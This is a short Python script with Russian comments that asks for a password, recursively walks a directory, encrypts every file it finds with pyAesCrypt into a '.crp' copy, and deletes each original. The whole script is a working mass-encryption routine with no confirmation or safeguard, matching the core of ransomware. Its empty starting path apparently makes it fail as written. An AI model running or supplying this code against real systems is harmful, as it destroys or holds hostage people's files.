import pyAesCrypt
import os


#функция шифрования файла

def encryption(file, password):

    #обозначим размер буффера
    buffer_size = 512 * 1024

    #вызываем метод шифрования
    pyAesCrypt.encryptFile(
        str(file),
        str(file) + '.crp',
        password,
        buffer_size
    )

    #чтобы видеть результат выводим на печать имя
    print("Файл '" + str(os.path.splitext(file)[0]) + "' зашифрован")

    #Удаляем исходный файл
    os.remove(file)

#функция сканирования директорий
def walking_by_dirs(dir, password):

    #перебираем все поддиректории в указанной директории
    for name in os.listdir(dir):
        path = os.path.join(dir, name)


        #если находим файл,то шифруем его
        if os.path.isfile(path):
            try:
                encryption(path, password)
            except Exception as ex:
                print(ex)




        else:
            walking_by_dirs(path, password)


password = input("Введите пароль для Шифрования")
walking_by_dirs('', password)
